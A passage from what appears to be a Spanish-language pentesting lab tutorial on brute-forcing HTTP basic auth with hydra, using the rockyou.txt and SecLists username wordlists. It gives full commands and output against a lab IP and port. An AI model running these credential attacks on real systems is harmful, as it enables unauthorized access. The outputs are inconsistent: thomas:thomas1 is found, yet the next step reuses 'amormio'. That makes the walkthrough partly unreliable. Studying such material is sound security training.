Ahora que conocemos el uso básico de `hydra`, intentemos otro ejemplo de ataque a HTTP basic auth utilizando wordlists separadas para nombres de usuario y contraseñas.

---

## Wordlists

Una de las wordlists de contraseñas más utilizadas es `rockyou.txt`, que tiene más de 14 millones de contraseñas únicas, ordenadas por lo comunes que son, recopiladas de bases de datos filtradas en línea de contraseñas y nombres de usuario. Básicamente, a menos que una contraseña sea realmente única, esta wordlist probablemente la contendrá. `rockyou.txt` ya existe en nuestro Pwnbox. Si estuviéramos usando `hydra` en una VM local, podríamos descargar esta wordlist desde el [Hashcat GitHub Repository](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt). Podemos encontrarla en el siguiente directorio:

```r
locate rockyou.txt

/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

En cuanto a nuestra wordlist de nombres de usuario, utilizaremos la siguiente wordlist de `SecLists`:

```r
locate names.txt

/opt/useful/SecLists/Usernames/Names/names.txt
```

Esta es una lista corta de nombres de usuario comunes que pueden encontrarse en cualquier servidor.

---

## Username/Password Attack

`Hydra` requiere al menos 3 flags específicos si las credenciales están en una sola lista para realizar un ataque de fuerza bruta contra un servicio web:

1. `Credentials`
2. `Target Host`
3. `Target Path`

Las credenciales también pueden separarse por `usernames` y `passwords`. Podemos usar el flag `-L` para la wordlist de nombres de usuario y el flag `-P` para la wordlist de contraseñas. Como no queremos brute force todos los nombres de usuario en combinación con las contraseñas en las listas, podemos decirle a `hydra` que se detenga después del primer inicio de sesión exitoso especificando el flag `-f`.

Tip: Añadiremos el flag "-u", para que pruebe todos los usuarios con cada contraseña, en lugar de probar las 14 millones de contraseñas con un usuario antes de pasar al siguiente.

```r
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

<...SNIP...>
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1

[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Vemos que aún podemos encontrar el mismo par funcional, pero en este caso, tomó mucho más tiempo encontrarlos, tardando casi 30 minutos en hacerlo. Esto se debe a que, aunque las contraseñas predeterminadas se utilizan comúnmente juntas, claramente no están entre las principales cuando se trata de wordlists individuales. Entonces, ya sea el nombre de usuario o la contraseña, está enterrado profundamente en nuestra wordlist, tomando mucho más tiempo para alcanzarlo.

---

## Username Brute Force

Si solo fuéramos a brute force el nombre de usuario o la contraseña, podríamos asignar un nombre de usuario o una contraseña estática con el mismo flag pero en minúsculas. Por ejemplo, podemos brute force contraseñas para el usuario `test` añadiendo `-l test`, y luego añadiendo una wordlist de contraseñas con `-P rockyou.txt`.

Dado que ya encontramos la contraseña en la sección anterior, podemos asignarla estáticamente con el flag "`-p`", y solo brute force para nombres de usuario que puedan usar esta contraseña.

```r
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking http-get://178.35.49.134:32901/

[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```